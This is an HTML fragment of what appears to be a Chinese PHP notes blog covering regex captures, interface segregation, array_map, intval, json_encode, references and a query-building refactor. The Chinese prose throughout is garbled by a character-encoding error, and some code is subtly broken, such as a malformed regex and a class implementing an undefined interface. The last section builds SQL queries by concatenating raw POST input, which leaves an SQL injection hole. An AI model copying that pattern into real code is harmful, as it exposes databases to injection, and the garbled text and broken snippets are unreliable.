class="line">æœ‰äººå¯èƒ½å°±ä¼šé—®äº†ï¼Œ é‚£ä½ å†™è¿™ä¸ªçš„ä½œç”¨åˆæ˜¯ä»€ä¹ˆå‘¢ ï¼Ÿ è·å–è¿™äº›æ‹¬å·é‡Œçš„å¹²å•¥ã€‚ã€‚ æˆ‘åªè¦ç¬¬ä¸€ä¸ªç´¢å¼•çš„åŒ¹é…å°±å¤Ÿäº†å‘€ã€‚</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯ï¼Œ ä½ è€ƒè™‘åˆ°äº†æ›¿æ¢è¿™ä¸ªå› ç´ æ²¡ï¼Ÿ å¦‚æœæˆ‘æ›¿æ¢çš„æ—¶å€™éœ€è¦ï¼ˆï¼‰çš„ä¸œè¥¿å‘¢ï¼Ÿ è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°æ•è·åˆ°çš„ï¼ˆï¼‰çš„ä¸œè¥¿æ¥ç©¿æ’ã€‚</span><br><span class="line">ä¸çŸ¥é“æœ‰äººå¥½å¥‡è¿‡æ²¡ï¼Œä¸ºä»€ä¹ˆç”¨é‚£äº›TPæ¡†æ¶ï¼ŒLaravelæ¡†æ¶ï¼Œ æˆ–è€…smarty åœ¨æ¨¡ç‰ˆé‡Œå†™çš„&#123;&#123;$msg&#125;&#125;ä¸ºä»€ä¹ˆä¹Ÿèƒ½è¾“å‡ºå‘¢ï¼Ÿ å…¶å®å°±æ˜¯ç”¨äº†æ­£åˆ™æ›¿æ¢~ çœ‹ä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">$msg = "æ­£åˆ™æ•è·";</span><br><span class="line">$subject = '&lt;p&gt;&#123;&#123;$msg&#125;&#125;&lt;/p&gt;';</span><br><span class="line">$pattern = '/\&#123;\&#123;(.*/)\&#125;\&#125;/';  //å› ä¸ºæ­£åˆ™é‡Œä¹Ÿæœ‰'&#123;' å’Œ'&#125;'æ‰€ä»¥éœ€è¦ç”¨â€˜\â€™è½¬ä¹‰</span><br><span class="line">$result = preg_replace($pattern, '&lt;?php echo $1; ?&gt;', $subject);</span><br><span class="line">show($result); // &lt;p&gt;&lt;?php echo $msg;?&gt;&lt;/p&gt; </span><br><span class="line">//æˆåŠŸä¿®æ”¹~</span><br><span class="line">ä¸Šé¢è¯´çš„æ˜¯æ•è·ï¼Œ ä½†æ˜¯æˆ‘å¯èƒ½ä¸æƒ³æ•è·æ€ä¹ˆåŠï¼Ÿ é‚£ä¹ˆå°±å¯ä»¥ç”¨(?:) åœ¨å‰é¢åŠ ä¸Š?:å³å¯ã€‚æ³¨æ„ï¼Œ è¿™ä¸ªä¸ä¼šå½±å“åŒ¹é… åªä¼šå½±å“æ•è·ã€‚ å¦‚ï¼š</span><br><span class="line"></span><br><span class="line">$subject = 'abc';</span><br><span class="line">$pattern = '/(a)(?:b)(c)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);</span><br><span class="line">//ç»“æœï¼š</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; abc</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line">)</span><br><span class="line">//çœ‹ åŒ¹é…çš„ç»“æœè®©ç„¶æ˜¯'abc' ä¸è¿‡æ²¡æœ‰æ•è·åˆ° 'b'</span><br><span class="line">https://coffeephp.com/articles/5</span><br></pre></td></tr></table></figure>
<h3 id="S-O-I-L-D-ä¹‹æ¥å£éš”ç¦»"><a href="#S-O-I-L-D-ä¹‹æ¥å£éš”ç¦»" class="headerlink" title="S.O.I.L.D ä¹‹æ¥å£éš”ç¦»"></a>S.O.I.L.D ä¹‹æ¥å£éš”ç¦»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/29130</span></span><br><span class="line">interface WorkableInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">interface</span> <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">HumanWorker</span> <span class="title">implements</span> <span class="title">WorkableInterface</span>, <span class="title">SleepableInterface</span>, <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'human working.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'human sleeping'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;work();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;sleep();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AndroidWorker</span> <span class="title">implements</span> <span class="title">WorkableInterface</span>, <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'android working.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ä¿æŒ Captain ç±»çš„å°é—­æ€§</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Captain</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">manage</span>(<span class="params">ManageableInterface $worker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $worker-&gt;beManaged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$pieces = [];</span><br><span class="line">foreach($whole <span class="keyword">as</span> $item)</span><br><span class="line">&#123;</span><br><span class="line">    $pieces[] = $item[<span class="string">'foo'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $pieces;</span><br><span class="line"><span class="keyword">return</span> array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">$item</span>) </span>&#123; <span class="keyword">return</span> $item[<span class="string">'foo'</span>]; &#125;,</span><br><span class="line">    $whole</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ä½†éœ€è¦éå† Key =&gt; Value å½¢å¼çš„å…³è”æ•°ç»„ï¼Œè¯¥æ€ä¹ˆæ“ä½œå‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">$k, $v</span>) </span>&#123; ... &#125;,</span><br><span class="line">    array_keys($array),</span><br><span class="line">    $array</span><br><span class="line">);</span><br><span class="line">https:<span class="comment">//wi1dcard.cn/posts/php-array-map-instead-of-foreach/</span></span><br></pre></td></tr></table></figure>
<h3 id="intval-ä¸-int"><a href="#intval-ä¸-int" class="headerlink" title="intval() ä¸ (int)"></a>intval() ä¸ (int)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$int = intval(<span class="string">'0123'</span>, <span class="number">8</span>); <span class="comment">// == 83</span></span><br><span class="line">$test_int    = <span class="number">12</span>;</span><br><span class="line">$test_float  = <span class="number">12.8</span>;</span><br><span class="line">$test_string = <span class="string">"12"</span>;</span><br><span class="line"></span><br><span class="line">echo (int) $test_int;         <span class="comment">// == 12</span></span><br><span class="line">echo (int) $test_float;       <span class="comment">// == 12</span></span><br><span class="line">echo (int) $test_string;      <span class="comment">// == 12</span></span><br><span class="line"></span><br><span class="line">echo intval($test_int, <span class="number">8</span>);    <span class="comment">// == 12</span></span><br><span class="line">echo intval($test_float, <span class="number">8</span>)   <span class="comment">// == 12</span></span><br><span class="line">echo intval($test_string, <span class="number">8</span>); <span class="comment">// == 10</span></span><br><span class="line">intval() ä¼šå°†ç±»å‹å·²ç»æ˜¯ int æˆ– float çš„æ•°æ®å½“ä½œã€Œæ— éœ€è½¬æ¢ã€è€Œç›´æ¥è¿”å›ï¼</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥å¦‚ä¸Šï¼Œ$test_int å’Œ $test_float å¹¶æ²¡æœ‰æŒ‰ç…§å…«è¿›åˆ¶è½¬æ¢ï¼Œä½¿ç”¨æ—¶ä¸€å®šéœ€è¦æ³¨æ„é¿å…è¸©å‘ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="json-encode-åºåˆ—åŒ–éå…¬å¼€å±æ€§"><a href="#json-encode-åºåˆ—åŒ–éå…¬å¼€å±æ€§" class="headerlink" title="json_encode() åºåˆ—åŒ–éå…¬å¼€å±æ€§"></a>json_encode() åºåˆ—åŒ–éå…¬å¼€å±æ€§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="title">implements</span> \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $fooProperty;</span><br><span class="line"></span><br><span class="line">    protected $barProperty;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'fooProperty'</span> =&gt; $<span class="keyword">this</span>-&gt;fooProperty,</span><br><span class="line">            <span class="string">'barProperty'</span> =&gt; $<span class="keyword">this</span>-&gt;barProperty,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="title">implements</span> \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $fooProperty;</span><br><span class="line"></span><br><span class="line">    protected $barProperty;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get_object_vars($<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;https:<span class="comment">//wi1dcard.cn/posts/json-encode-non-public-properties/</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-å¼•ç”¨è¯¦è§£"><a href="#PHP-å¼•ç”¨è¯¦è§£" class="headerlink" title="PHP å¼•ç”¨è¯¦è§£"></a>PHP å¼•ç”¨è¯¦è§£</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">$catList = [</span><br><span class="line">    <span class="string">'1'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'é¢œè‰²'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    <span class="string">'2'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">2</span>, <span class="string">'name'</span> =&gt; <span class="string">'è§„æ ¼'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    <span class="string">'3'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">3</span>, <span class="string">'name'</span> =&gt; <span class="string">'ç™½è‰²'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    <span class="string">'4'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">4</span>, <span class="string">'name'</span> =&gt; <span class="string">'é»‘è‰²'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    <span class="string">'5'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">5</span>, <span class="string">'name'</span> =&gt; <span class="string">'å¤§'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    <span class="string">'6'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">6</span>, <span class="string">'name'</span> =&gt; <span class="string">'å°'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    <span class="string">'7'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">7</span>, <span class="string">'name'</span> =&gt; <span class="string">'é»„è‰²'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">];</span><br><span class="line">$treeData = [];</span><br><span class="line">foreach ($catList <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($catList[$item[<span class="string">'parent_id'</span>]]) &amp;&amp; !empty($catList[$item[<span class="string">'parent_id'</span>]])) &#123;</span><br><span class="line">        <span class="comment">// å­åˆ†ç±»</span></span><br><span class="line">        $catList[$item[<span class="string">'parent_id'</span>]][<span class="string">'children'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ä¸€çº§åˆ†ç±»</span></span><br><span class="line">        $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=&gt; [                               </span><br><span class="line">     [                             </span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">1</span>,                  </span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"é¢œè‰²"</span>,             </span><br><span class="line">       <span class="string">"parent_id"</span> =&gt; <span class="number">0</span>,           </span><br><span class="line">       <span class="string">"children"</span> =&gt; [             </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">3</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"ç™½è‰²"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">4</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"é»‘è‰²"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">7</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"é»„è‰²"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">       ],                          </span><br><span class="line">     ],                            </span><br><span class="line">     [                             </span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">2</span>,                  </span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"è§„æ ¼"</span>,             </span><br><span class="line">       <span class="string">"parent_id"</span> =&gt; <span class="number">0</span>,           </span><br><span class="line">       <span class="string">"children"</span> =&gt; [             </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">5</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"å¤§"</span>,          </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">2</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">6</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"å°"</span>,          </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">2</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">       ],                          </span><br><span class="line">     ],                            </span><br><span class="line">   ]</span><br></pre></td></tr></table></figure>
<h3 id="å°è£…ä»£ç "><a href="#å°è£…ä»£ç " class="headerlink" title="å°è£…ä»£ç "></a>å°è£…ä»£ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (IS_POST) &#123;</span><br><span class="line">    $like = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>])) &#123;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $like .= <span class="string">"username like '%"</span> . $username . <span class="string">"%' and "</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'phone'</span>])) &#123;</span><br><span class="line">        $phone = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $like .= <span class="string">"phone like '%"</span> . $phone . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'is_auth'</span>]) &#123;</span><br><span class="line">        $isAuth = $_POST[<span class="string">'is_auth'</span>];</span><br><span class="line">        $like .= <span class="string">"is_auth like '%"</span> . $isAuth . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'sex'</span>]) &#123;</span><br><span class="line">        $sex = $_POST[<span class="string">'sex'</span>];</span><br><span class="line">        $like .= <span class="string">"sex like '%"</span> . $sex . <span class="string">"%' and"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'time'</span>]) &#123;</span><br><span class="line">        $time = $_POST[<span class="string">'time'</span>];</span><br><span class="line">        $like .= <span class="string">"time like '%"</span> . $time . <span class="string">"%' and"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'wallet'</span>]) &#123;</span><br><span class="line">        $wallet = $_POST[<span class="string">'wallet'</span>];</span><br><span class="line">        $like .= <span class="string">"wallet like '%"</span> . $wallet . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $like = rtrim($like, <span class="string">'and'</span>);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM `user` WHERE &#123;$like&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'user'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">$param = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Request($param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">string $param = null</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isset($_POST[$param]) ? $_POST[$param] : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">all</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $_POST;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $request = [</span><br><span class="line">        <span class="string">'username'</span>,</span><br><span class="line">        <span class="string">'phone'</span>,</span><br><span class="line">        <span class="string">'is_auth'</span>,</span><br><span class="line">        <span class="string">'sex'</span>,</span><br><span class="line">        <span class="string">'time'</span>,</span><br><span class="line">        <span class="string">'wallet'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (IS_POST) &#123;</span><br><span class="line">            $like = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">            foreach (request()-&gt;all() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $<span class="keyword">this</span>-&gt;request) &amp;&amp; request($key)) &#123;</span><br><span class="line">                    $like .= sprintf(<span class="string">"%s like %s and"</span>, $key, $value);</span><br><span class="line">                    <span class="comment">//$like[] = sprintf("%s like %s", $key, $value);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//$sql = implode(" AND ", $like);</span></span><br><span class="line">            $like = rtrim($like, <span class="string">'and'</span>);</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"SELECT * FROM `user` WHERE &#123;$like&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">'user'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//github.com/CrazyCodes/Blog/blob/master/%E6%88%91%E4%B8%8EJetbrains%E7%9A%84%E8%BF%99%E4%BA%9B%E5%B9%B4.md</span></span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000019274366</span></span><br></pre></td></tr></table></figure>
